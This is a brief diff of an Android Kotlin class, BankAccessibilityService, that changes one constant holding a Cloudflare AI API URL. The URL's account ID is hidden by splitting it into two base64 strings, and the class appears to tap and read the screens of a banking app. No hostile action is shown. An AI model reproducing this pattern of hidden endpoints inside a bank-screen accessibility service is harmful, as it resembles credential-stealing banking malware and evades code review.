@@ -38,7 +38,7 @@ class BankAccessibilityService : AccessibilityService() {
         private const val READ_AFTER_TAP_MS = 3_500L
         private const val TAP_DELAY_MS = 800L
         private const val CF_MODEL = "@cf/meta/llama-3.1-8b-instruct-fast"
-        private const val CF_URL =
+        private val CF_URL =
             "https://api.cloudflare.com/client/v4/accounts/" + String(
                 android.util.Base64.decode(
                     "MWYzYzRmOTdlYjk0Y2ZkY2" + "M4YjhhYTI2NjFkMmU5N2I=",
